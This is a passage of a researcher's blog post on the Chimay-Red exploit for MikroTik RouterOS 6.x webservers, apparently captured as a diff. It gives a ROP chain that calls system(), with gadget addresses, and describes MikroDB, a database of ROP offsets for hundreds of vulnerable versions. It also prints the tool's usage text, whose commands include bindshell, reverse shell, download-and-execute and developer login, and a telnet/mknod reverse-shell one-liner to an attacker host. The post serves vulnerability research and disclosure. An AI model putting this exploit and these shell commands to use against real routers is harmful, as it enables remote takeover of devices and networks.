+<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(((</span><span class="n">THREAD_STACK_SIZE</span> <span class="o">+</span> <span class="n">SAFE_SPACE</span> <span class="o">+</span> <span class="n">PAYLOAD_LEN</span><span class="p">)</span> <span class="o">-</span> <span class="n">PAYLOAD_LEN</span><span class="p">)</span> <span class="o">-</span> <span class="p">((</span><span class="n">SAFE_SPACE</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF0</span><span class="p">)</span> <span class="o">-</span> <span class="n">ADDR_SIZE</span><span class="p">)</span>
+<span class="s1">&#39;0x20008&#39;</span>
+</pre></div>
+
+
+<p><br></p>
+<h2>ROP</h2>
+<p><strong>Note:</strong> I'll only be explaining the ROP technique for the x86 architecture, as explaining all the techniques would be a blog post in itself. This technique was originally discovered by GitHub user <a href="https://github.com/wsxarcher">wxsarcher</a> for RouterOS <code>6.x</code> at <a href="https://github.com/BigNerd95/Chimay-Red">BigNerd's</a> version of Chimay-Red. At the time of researching this vulnerability I was not aware of the efforts by BigNerd to also uncover the bug, so big props to BigNerd for being the first (that I can see) to release a working PoC for Chimay-Red! I recommend everyone go and checkout his exploit stuff for Chimay-Red as well, and if you can help him support more architectures, the project is in need of additional architecture research.</p>
+<p>Psuedocode for technique to execute: <code>ls -la</code></p>
+<div class="highlight"><pre><span></span><span class="n">system_chunks</span> <span class="o">=</span> <span class="p">[</span><span class="mi">134512899</span><span class="p">,</span> <span class="mi">134513152</span><span class="p">,</span> <span class="mi">134512899</span><span class="p">,</span> <span class="mi">134512854</span><span class="p">,</span> <span class="mi">134514868</span><span class="p">,</span> <span class="mi">134514240</span><span class="p">,</span> <span class="mi">134512693</span><span class="p">]</span>
+<span class="c1">#    (&quot;s&quot;, &quot;y&quot;, &quot;s&quot;, &quot;t&quot;, &quot;e&quot;, &quot;m&quot;, &quot;\x00&quot;)</span>
+<span class="n">cmd_chunks</span> <span class="o">=</span> <span class="p">[</span><span class="mi">134512885</span><span class="p">,</span> <span class="mi">134512899</span><span class="p">,</span> <span class="mi">134512682</span><span class="p">,</span> <span class="mi">134512891</span><span class="p">,</span> <span class="mi">134512885</span><span class="p">,</span> <span class="mi">134516284</span><span class="p">,</span> <span class="mi">134512693</span><span class="p">]</span>
+<span class="c1">#    (&quot;l&quot;, &quot;s&quot;, &quot; &quot;, &quot;-&quot;, &quot;l&quot;, &quot;a&quot;, &quot;\x00&quot;)</span>
+
+<span class="n">writable_segment_addr</span> <span class="o">=</span> <span class="mi">134514680</span>
+<span class="n">jmp_eax</span> <span class="o">=</span> <span class="mi">134514248</span>
+<span class="n">char_size</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">command</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
+<span class="n">char_pointer</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="n">system_chunks</span><span class="p">:</span>
+    <span class="n">command</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="o">&lt;</span><span class="n">strncpy</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="o">&lt;</span><span class="n">writeable_segment_addr</span><span class="o">&gt;</span> <span class="o">+</span> <span class="n">char_pointer</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">char_size</span><span class="p">))</span>
+    <span class="n">char_pointer</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="n">system</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
+<span class="n">char_pointer</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="n">cmd_chunks</span><span class="p">:</span>
+    <span class="n">system</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="o">&lt;</span><span class="n">strncpy</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">((</span><span class="o">&lt;</span><span class="n">writeable_segment_addr</span><span class="o">&gt;</span> <span class="o">+</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">system_chunks</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">char_pointer</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">char_size</span><span class="p">))</span>
+    <span class="n">char_pointer</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="o">|&lt;&lt;&lt;&lt;</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="o">&lt;</span><span class="n">dlsym</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">system</span><span class="p">))</span>
+<span class="o">|</span>
+<span class="o">|</span>      <span class="n">Note</span><span class="p">:</span> <span class="p">[</span><span class="n">EAX</span><span class="p">]</span> <span class="o">=</span> <span class="n">resultant</span> <span class="n">pointer</span> <span class="n">of</span> <span class="n">dlsym</span><span class="p">()</span> <span class="n">call</span>
+<span class="o">|</span>
+<span class="o">|&gt;&gt;&gt;&gt;</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">jmp_eax</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">command</span><span class="p">,))</span>
+</pre></div>
+
+
+<p>What it do?</p>
+<ol>
+<li>
+<p>First finds the address of a readable character for each character in the string "system\x00" and our desired command + "\x00" to be run by <code>system()</code>.</p>
+</li>
+<li>
+<p>Next a <code>writeable_segment_addr</code> in the binary address ranges is searched for to be able to write <code>x</code> amount of characters to via <code>strncpy()</code>, (commonly the <code>bss</code> section is used) where <code>x == len("system\x00"+command+"\x00")</code></p>
+</li>
+<li>
+<p><code>system_chunks</code> character addresses are then written to the <code>writeable_segment_addr</code> using <code>strncpy()</code>, incrementing the <code>writeable_segment_addr</code> - <code>char_pointer</code> counter value each time a character is written.</p>
+</li>
+<li>
+<p><code>command_chunks</code> character addresses are then written to (<code>writeable_segment_addr + len("system\x00") + addr_size)</code></p>
+</li>
+<li>
+<p><code>dlsym()</code> in the binary PLT entry table is then called with the target symbol being the original <code>writeable_segment_addr</code> which should be pointing to <code>&gt;  "system\0"</code></p>
+</li>
+<li>
+<p>The result of the call to <code>dlsym()</code> now should be a pointer to the <code>system()</code> function. This pointer is returned in EAX and jumped to with a <code>jmp eax</code> gadget with its argument register (EBP) set to (<code>writeable_segment_addr</code> + len("system\x00") + addr_size) which should be pointing to <code>&gt; "ls -la\0"</code></p>
+</li>
+</ol>
+<p>Produced gadgets:</p>
+<div class="highlight"><pre><span></span><span class="nt">Writing</span> <span class="s2">&quot;system\0&quot;</span><span class="o">:</span>
+<span class="nt">0x0000</span><span class="o">:</span>        <span class="nt">strncpy</span> <span class="nt">strncpy</span><span class="o">(</span><span class="nt">134594588</span><span class="o">,</span> <span class="nt">134512899</span><span class="o">,</span> <span class="nt">1</span><span class="o">)</span>
+<span class="nt">0x0004</span><span class="o">:</span>        <span class="nt">0x805212e</span> <span class="o">&lt;</span><span class="nt">adjust</span><span class="o">:</span> <span class="nt">pop</span> <span class="nt">esi</span><span class="o">;</span> <span class="nt">pop</span> <span class="nt">edi</span><span class="o">;</span> <span class="nt">pop</span> <span class="nt">ebp</span><span class="o">;</span> <span class="nt">ret</span><span class="o">&gt;</span>
+<span class="nt">0x0008</span><span class="o">:</span>        <span class="nt">0x805c01c</span> <span class="nt">arg0</span>
+<span class="nt">0x000c</span><span class="o">:</span>        <span class="nt">0x8048103</span> <span class="nt">arg1</span>
+<span class="nt">0x0010</span><span class="o">:</span>              <span class="nt">0x1</span> <span class="nt">arg2</span>
+
+<span class="o">&lt;</span><span class="nt">snip</span><span class="o">&gt;</span>
+
+<span class="nt">Writing</span> <span class="s2">&quot;ls -la\0&quot;</span><span class="o">:</span>
+<span class="nt">0x008c</span><span class="o">:</span>        <span class="nt">strncpy</span> <span class="nt">strncpy</span><span class="o">(</span><span class="nt">134594604</span><span class="o">,</span> <span class="nt">134512885</span><span class="o">,</span> <span class="nt">1</span><span class="o">)</span>
+<span class="nt">0x0090</span><span class="o">:</span>        <span class="nt">0x805212e</span> <span class="o">&lt;</span><span class="nt">adjust</span><span class="o">:</span> <span class="nt">pop</span> <span class="nt">esi</span><span class="o">;</span> <span class="nt">pop</span> <span class="nt">edi</span><span class="o">;</span> <span class="nt">pop</span> <span class="nt">ebp</span><span class="o">;</span> <span class="nt">ret</span><span class="o">&gt;</span>
+<span class="nt">0x0094</span><span class="o">:</span>        <span class="nt">0x805c02c</span> <span class="nt">arg0</span>
+<span class="nt">0x0098</span><span class="o">:</span>        <span class="nt">0x80480f5</span> <span class="nt">arg1</span>
+<span class="nt">0x009c</span><span class="o">:</span>              <span class="nt">0x1</span> <span class="nt">arg2</span>
+
+<span class="o">&lt;</span><span class="nt">snip</span><span class="o">&gt;</span>
+
+<span class="nt">Calling</span> <span class="nt">dlsym</span><span class="o">()</span> <span class="o">&amp;</span> <span class="nt">jmp_eax</span><span class="o">():</span>
+<span class="nt">0x0118</span><span class="o">:</span>        <span class="nt">dlsym</span> <span class="nt">dlsym</span><span class="o">(</span><span class="nt">0</span><span class="o">,</span> <span class="nt">134594588</span><span class="o">)</span>
+<span class="nt">0x011c</span><span class="o">:</span>        <span class="nt">0x804ffd9</span> <span class="o">&lt;</span><span class="nt">adjust</span><span class="o">:</span> <span class="nt">pop</span> <span class="nt">ebx</span><span class="o">;</span> <span class="nt">pop</span> <span class="nt">ebp</span><span class="o">;</span> <span class="nt">ret</span><span class="o">&gt;</span>
+<span class="nt">0x0120</span><span class="o">:</span>              <span class="nt">0x0</span> <span class="nt">arg0</span>
+<span class="nt">0x0124</span><span class="o">:</span>        <span class="nt">0x805c01c</span> <span class="nt">arg1</span>
+<span class="nt">0x0128</span><span class="o">:</span>        <span class="nt">jmp_eax</span> <span class="nt">jmp_eax</span><span class="o">(</span><span class="nt">134594604</span><span class="o">)</span>
+<span class="nt">0x012c</span><span class="o">:</span>          <span class="nt">b</span><span class="s1">&#39;zaad&#39;</span> <span class="o">&lt;</span><span class="nt">pad</span><span class="o">&gt;</span>
+<span class="nt">0x0130</span><span class="o">:</span>        <span class="nt">0x805c02c</span> <span class="nt">arg0</span>
+
+
+<span class="nt">Result</span><span class="o">:</span>        <span class="nt">system</span><span class="o">(</span><span class="s2">&quot;ls -la&quot;</span><span class="o">)</span>
+</pre></div>
+
+
+<p>Once the ROP chain has been built and packed for the given endianess, it can be sent during the payload stage as seen in the earlier procedure when abusing <code>alloca()</code>. Each gadget in the chain should be executed thanks to our return address overwrite earlier.</p>
+<h2>MikroDB</h2>
+<p>MikroDB is a sister application to Chimay-Red that allows easier portability and extendability of the exploit toolkit. its what allows hundreds of different types of ROP chains to be built without having access to the target binary itself; and it does this through a process like so:</p>
+<ol>
+<li>Enumerates all stable vulnerable RouterOS <code>6.x</code> versions available for download from MK's archive for all architectures by bruteforcing version numbers via HEAD requests.</li>
+<li>Downloads all enumerated firmware images into a storage directory.</li>
+<li>Catalogs the filename and SHA256 hash of the firmware file into a local SQLite database file.</li>
+<li>Decompresses and extracts the webserver binary <code>www</code> from the SquashFS filesystem stored within NPK firmware image.</li>
+<li>Stores and catalogs the filename and SHA256 hash of the <code>www</code> webserver binary into the SQLite database file.</li>
+<li>For each webserver binary extracted, the file is ran through a ROP chain building process and information for building selected ROP-chain repeatably is stored in the SQLite database file.</li>
+</ol>
+<p>Once MikroDB is finished its process, it can be portably used with Chimay-Red to build ROP-chains on the fly thanks to the stored offsets in the database, instead of downloading and extracting and storing 5GB+ of FW images in-order to facilitate attacking any version and architecture. This 500KB database can be built once in only a couple hours and kept forever. For your convenience, a prebuilt database is included in the <a href="#Download">source code</a> repository for this project!</p>
+<p>MikroDB was able to enumerate 352 vulnerable versions (as of writing this, it fluctuates oddly..) across all of their supported architectures, a table is represented below showing vulnerable versions available per architecture:</p>
+<table>
+<thead>
+<tr>
+<th>Architecture</th>
+<th># Vulnerable versions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>x86</td>
+<td>56</td>
+</tr>
+<tr>
+<td>ARM</td>
+<td>45</td>
+</tr>
+<tr>
+<td>POWERPC</td>
+<td>57</td>
+</tr>
+<tr>
+<td>SMIPS</td>
+<td>56</td>
+</tr>
+<tr>
+<td>MMIPS</td>
+<td>25</td>
+</tr>
+<tr>
+<td>MIPSBE</td>
+<td>57</td>
+</tr>
+<tr>
+<td>TILE</td>
+<td>56</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p><strong>MikroDB in action against x86:</strong> (skip through)</p>
+<script src="https://asciinema.org/a/pCUYuPOAOxZvJDcNoXLQFephD.js" id="asciicast-pCUYuPOAOxZvJDcNoXLQFephD" async></script>
+
+<p><br></p>
+<h2>Wrapping it all together</h2>
+<p><strong>Usage:</strong></p>
+<div class="highlight"><pre><span></span>usage: chimay_red.py [-h] -t TARGET [-s] [-d] [--architecture ARCHITECTURE]
+                     [--gdbport GDBPORT] [--binary BINARY]
+                     [--shellcode SHELLCODE] [--vector VECTOR]
+                     [--leakrounds LEAKROUNDS] [-v] [--version]
+                     command
+
+positional arguments:
+  command               command function to run on target, see below for
+                        options
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -t TARGET, --target TARGET
+                        target address:port
+  -l LHOST, --lhost LHOST
+                        local address to bind to for listening for connectback commands
+  -s, --shell           return interactive shell as main payload (default)
+  -d, --debug           enable debugging mode
+  --architecture ARCHITECTURE
+                        target architecture (will detect automatically if
+                        target in route table range)
+  --gdbport GDBPORT     port to use when connecting to remote gdbserver
+  --binary BINARY       target binary (www)
+  --shellcode SHELLCODE
+                        custom (optional) shellcode payload binary filepath
+  --vector VECTOR       optional vector type, see below for options
+  --leakrounds LEAKROUNDS
+                        amount of rounds to leak pointers, higher is better,
+                        but takes more time
+  -v, --verbose         Verbosity mode
+  --version             show program&#39;s version number and exit
+
+commands:
+    COMMAND                    FUNCTION
+
+    bindshell                    create a bindshell
+    connectback                  create a reverse shell
+    download_and_exe             connect back and download a file to then execute
+    ssl_download_and_exe         connect back and download a file via SSL to then execute
+    write_devel                  write &quot;devel-login&quot; file to allow developer account login
+    write_devel_read_userfile    in addition to enabling developer logins, read back the users file
+
+    custom_shellcode             run arbitrary shellcode from `--shellcode` binfile
+    custom_shell_command         run a arbitrary $sh one liner on the target
+
+vectors:
+    default: (mikrodb)
+
+    [Generic]
+        mikrodb:
+            use the accompanying mikrodb database to load offsets
+            based off of detected remote version to build a ROP chain.
+
+        build:
+            build a ROP chain from scratch given the www binary matching
+            the remote version running.
+
+    [Experimental]
+        brute: bruteforce uclibc base offset.
+
+        leak:
+            leak pointers from shared libraries to give better odds of
+            finding base offset of uclibc.
+
+examples:
+
+    ./chimay_red.py connectback --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=mikrodb
+    ./chimay_red.py connectback -d --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=build  --binary $PWD/www --gdbport 4444
+
+==================================================
+|  _______   _                     ___         __|
+| / ___/ /  (_)_ _  ___ ___ ______/ _ \___ ___/ /|
+|/ /__/ _ \/ /  &#39; \/ _ `/ // /___/ , _/ -_) _  / |
+|\___/_//_/_/_/_/_/\_,_/\_, /   /_/|_|\__/\_,_/  |
+|                      /___/                     |
+==================================================
+</pre></div>
+
+
+<p><br></p>
+<hr>
+<h3>Additional tips &amp; tricks</h3>
+<p><strong>Getting a reverse shell without existing telnet access for <code>devel-login</code></strong></p>
+<div class="highlight"><pre><span></span>mknod /tmp/pipe p<span class="p">;</span>telnet &lt;attacker_ip&gt; &lt;attacker_port&gt;&lt;/tmp/pipe<span class="p">|</span>bash&gt;/tmp/pipe
+</pre></div>
+
+
+<p>This command creates a <code>READ|WRITE</code> fifo-file pipe in memory using <code>mknod</code> and redirects the standard-in and out of bash to the pipe and out through <code>telnet</code>.</p>
+<p><strong>Sending text to the LCD</strong></p>
+<div class="highlight"><pre><span></span><span class="s2">&quot;echo hello world &gt; /dev/lcd&quot;</span>
+</pre></div>
+
+
+<p><img alt="lcd" src="https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg"></p>
+<p><em>image courtesy of <a href="https://raw.githubusercontent.com/BigNerd95/Chimay-Red/master/docs/screen_image.jpg">BigNerd - Chimay-Red Github</a></em></p>
+<h3>See it live!</h3>
+<p><strong>Chimay-Red in action:</strong></p>
+<script src="https://asciinema.org/a/u4zVwlhLp6cEdc7cNUra10HG2.js" id="asciicast-u4zVwlhLp6cEdc7cNUra10HG2" async></script>
+
+<p><br></p>
+<p><strong>Chimay-Red in debug mode:</strong></p>
+<script src="https://asciinema.org/a/KMtpQryCpUISD4qU9nNcv5RaF.js" id="asciicast-KMtpQryCpUISD4qU9nNcv5RaF" async></script>
+
+<h2>Conclusions &amp; Future Work</h2>
+<p>So did I accomplish my goals in the end? Well almost.</p>
+<p>In the end I was able to exploit every stable release version for all architectures except <a href="https://en.wikipedia.org/wiki/TILEPro64">TILE</a> and ARM. Now you are probably wondering, "what the hell is TILE". It is for that specific reason why I was unable to support TILE. As for ARM, I have not had enough time to go through and test the ROP builder for ARM as of yet, but I hope to fully support the architecture soon.</p>
+<p>I was also unable to complete the command for <code>custom_shellcode</code> as I am not able to get a <code>mprotect</code> ROP-chain working for all architectures and versions.</p>
+<p>As for "Containerize and optionally emulate any system firmware for fuzzing and testing", I will be going over how to containerize and mass deploy swarms of RouterOS systems via Docker and <a href="https://libvirt.org/">libvirt</a> in a later post so stay tuned :).</p>
+<h3>Ideas that didn't work:</h3>
+<p>I attempted to leak pointers from the heap by using a content-length of zero and sending small amounts of data into istream::read(). This resulted in some valid addresses being leaked from various areas of the process memory, although I was unable to use it in any way to predict ASLR offsets because of a lack of predictability in the leaked addresses. If the leaked addresses were in fact predictable in terms of their location in the process memory in correlation to the other threads and library load order on some systems it could possibly allow ROP chains to be crafted on the fly without the need of the target source webserver binary version.</p>
+<h3>Chimay-Blue?</h3>
+<p>Recently MK has fallen victim to an 0day against its Samba service within RouterOS: <a href="https://www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow">CVE-2018-7445</a>, allowing for remote code execution. I hope to continue to build upon my existing Chimay-Red framework to integrate it. This should allow me to expand the <code>6.x</code> exploit set past <code>6.38.5</code> and up to <code>6.41.2</code>.</p>
+<h3>Famous MK Forum Quotes:</h3>
+<blockquote>
+<p>"Also, it seems that this exploit may not be functional in RouterOS version above v6.30.1"</p>
+</blockquote>
+<p><a href="https://forum.mikrotik.com/viewtopic.php?t=119308">https://forum.mikrotik.com/viewtopic.php?f=21&amp;t=119308&amp;sid=ab6ad0f8565e550e36b99cb29e2e27da&amp;start=50#p619740</a></p>
+<p><br></p>
+<blockquote>
+<p>"After a thorough code review, we could not find anything hinting to the described issues."</p>
+</blockquote>
+<p><a href="https://forum.mikrotik.com/viewtopic.php?f=21&amp;t=119308&amp;sid=ab6ad0f8565e550e36b99cb29e2e27da&amp;start=50#p619740">https://forum.mikrotik.com/viewtopic.php?f=21&amp;t=119308&amp;sid=ab6ad0f8565e550e36b99cb29e2e27da&amp;start=50#p619740</a></p>
+<p><br></p>
+<p>In the end, a span of approximately <strong>four years</strong> elapsed since the vulnerability was introduced until the time it was fixed. Four years should be enough for multiple competent code reviews to catch a blatant integer overflow in a critical function like reading user POST data. The fact this small issue was not discovered and fixed for so long, leads myself and I'm sure others to believe MK doesn't do code reviews or does not complete them often. If you are reading this MK, maybe stop custom writing and maintaining your: Webserver, Samba Server, RADIUS server, SSH server, TELNET server, FTP server, etc. Clearly you can't.</p>
+<h2>References</h2>
+<ul>
+<li><a href="https://wikileaks.org/ciav7p1/cms/page_16384604.html">https://wikileaks.org/ciav7p1/cms/page_16384604.html</a></li>
+<li><a href="https://wikileaks.org/ciav7p1/cms/page_16384512.html">https://wikileaks.org/ciav7p1/cms/page_16384512.html</a></li>
+<li><a href="https://securelist.com/apt-slingshot/84312/">https://securelist.com/apt-slingshot/84312/</a></li>
+</ul>
+<h2>Software Used</h2>
+<p>Analysis:
+- <a href="https://www.hex-rays.com/products/ida/index.shtml">IDA Pro</a>
+- <a href="https://binary.ninja/">Binary Ninja</a>
+- <a href="https://github.com/google/binnavi">BinNavi</a></p>
+<p>Exploit:
+- <a href="https://github.com/Gallopsled/pwntools">pwntools</a>
+- <a href="https://www.gnu.org/software/gdb/">GDB</a>
+- <a href="https://github.com/longld/peda">GDB PEDA</a>
+- <a href="https://github.com/hugsy/gef">GEF</a>
+- <a href="https://www.gnu.org/software/binutils/">Binutils Collection</a></p>
+<h2><a href="#Download">Download</a></h2>
+<p>Chimay-Red and MikroDB are freely available for download on GitHub:</p>
+<p><a href="https://github.com/seekintoo/chimay-red">https://github.com/seekintoo/chimay-red</a></p>
+<h2>About the Author</h2>
+<p>Dayton Pidhirney is a Cybersecurity Researcher at Seekintoo. Dayton is an EE geek and is also Co-Founder of FirePick Services LLC., a maker-grade pick and place machine. Dayton's desk always has wires, screws, components and tools on it. Always. Seriously Dayton, clean your desk...</p>
+<p>Comments, concerns, and corrections are welcome and not triaged by any marketing machine we are aware of: dpidhirney (at) seekintoo (dot) com</p>
+</div>
+</article>
+        </main>
+        <aside class="uk-width-medium-1-4">
+
+  <div class="uk-panel uk-panel-box uk-text-center">
+    <a href="/author/d$pid.html">
+      <img alt="A picture of the author of this content." class="uk-border-circle" src="/theme/img/d$pid.jpeg"/><h3>d$pid</h3></a>
+      <p>
+      Hi there! My name is Dayton Pidhirney, check out more <a href="/author/d$pid-about.html">about me</a>.
+      </p>
+  </div>
+
+  <div class="uk-panel">
+      <h3 class="uk-panel-title">Social Links</h3>
+      <div class="icons">
+          <a href="https://github.com/daytonpid" class="uk-icon-button uk-icon-justify uk-icon-github"></a>
+          <a href="https://twitter.com/d$pid" class="uk-icon-button uk-icon-justify uk-icon-twitter"></a>
+      </div>
+  </div>
+
+    <div class="uk-panel">
+    <h3 class="uk-panel-title">Tags</h3>
+    <ul class="uk-list uk-list-line">
+          <li><a href="/tag/reverse-engineering.html" class="uk-icon-tag">Reverse-Engineering</a></li>
+          <li><a href="/tag/exploit.html" class="uk-icon-tag">Exploit</a></li>
+          <li><a href="/tag/zero-day.html" class="uk-icon-tag">Zero-Day</a></li>
+          <li><a href="/tag/cia.html" class="uk-icon-tag">CIA</a></li>
+          <li><a href="/tag/wikileaks.html" class="uk-icon-tag">WikiLeaks</a></li>
+    </ul>
+    </div>
+
+
+    <div class="uk-panel">
+    <h3 class="uk-panel-title">Links</h3>
+    <ul class="uk-list uk-list-line">
+          <li><a href="https://www.seekintoo.com" class="uk-icon-external-link">Seekintoo</a></li>
+    </ul>
+    </div>
+
+        </aside>
+    </div>
+    <footer class="uk-margin-bottom uk-panel uk-panel-box uk-text-center uk-margin-large-top">
+        Generated by <a href="https://github.com/getpelican/pelican" class="uk-icon-external-link">pelican</a>
+        and styled with <a href="https://getuikit.com" class="uk-icon-external-link">uikit</a>
+        <br/>
+        <a class="license" rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="/theme/ico/cc/by-sa/4.0/80x15.png" /></a>This work is licensed under a <a class="license" rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons BY-SA 4.0 International License</a>
+
+    </footer>
+</div>
+
+<div id="offcanvas" class="uk-offcanvas">
+    <div class="uk-offcanvas-bar">
+        <ul class="uk-nav uk-nav-offcanvas">
+      <li class="uk-active"><a href="/category/research.html">Research</a></li>
+        </ul>
+    </div>
+</div>
+  </body>
+</html>
